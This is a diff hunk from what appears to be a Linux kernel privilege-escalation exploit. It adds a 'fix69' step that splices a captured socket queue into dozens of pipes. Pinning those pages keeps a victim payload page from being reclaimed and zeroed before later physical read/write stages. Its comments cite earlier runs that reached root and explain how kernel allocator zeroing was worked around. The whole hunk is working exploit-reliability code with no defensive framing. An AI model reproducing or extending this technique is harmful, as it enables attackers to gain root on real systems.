@@ -4143,6 +4143,49 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     /* Leak keep_cli[1..] and keep_srv[1..] on purpose — their skbs pin
      * captured pages; closing would free them back to buddy. */
+    /* fix69: conn0's queue does NOT stay pinned -- the route stage reads
+     * reclaim_sv (= the conn0 fds) dry, so win enter q0=1 is constant in
+     * every round even though chain12's rxq snapshot shows the queue
+     * populated at send time (3670016/163840).  The capture skb is freed
+     * and the victim page goes BARE: init_on_free=n leaves the stale
+     * bytes so it still reads alive at win enter, and it dies only when
+     * an allocator takes the page back (init_on_alloc zeroing ->
+     * "payload table dead tbl=0": redo2 at +100ms after win enter, redo3
+     * at +41s; redo1 survived to root=1 on an idle boot purely by the
+     * low alloc traffic).  Splice the hit connection's queue into hold
+     * pipes FIRST: skb_splice_bits moves the skb frag pages into
+     * pipe_buffers (same physical pages, no copy), so the pipes pin them
+     * for the process lifetime and the win/physrw stages can never
+     * observe a re-zeroed table.  Multi-pipe chunking avoids
+     * F_SETPIPE_SZ (pipe-user-pages-soft is exhausted by the drain
+     * pipes; resize would EPERM).  */
+    if (payload_mode == PAGE_PAYLOAD_FOPS && hit_c >= 0 && hit_c < nconn) {
+      int pin_q = -1;
+      if (ioctl(keep_srv[hit_c], SIOCINQ, &pin_q) == 0 && pin_q > 0) {
+        int remain = pin_q;
+        int npipe = 0;
+        while (remain > 0 && npipe < 64) {
+          int hp[2] = {-1, -1};
+          if (pipe(hp) != 0) {
+            pr_warning("payload pin pipe() errno=%d after %d pipes\n",
+                       errno, npipe);
+            break;
+          }
+          size_t chunk = remain > 65536 ? 65536 : (size_t)remain;
+          ssize_t sp = splice(keep_srv[hit_c], NULL, hp[1], NULL, chunk,
+                              SPLICE_F_NONBLOCK);
+          if (sp <= 0) break;
+          npipe++;
+          remain -= (int)sp;
+          if ((size_t)sp < chunk) break;
+        }
+        pr_info("payload pin splice conn=%d q=%d pipes=%d remain=%d\n",
+                hit_c, pin_q, npipe, remain);
+        /* Pipe fds leak on purpose: closing them releases the pages. */
+      } else {
+        pr_warning("payload pin SIOCINQ q=%d errno=%d\n", pin_q, errno);
+      }
+    }
   }
   {
     long slabs = -1, objs = 0;
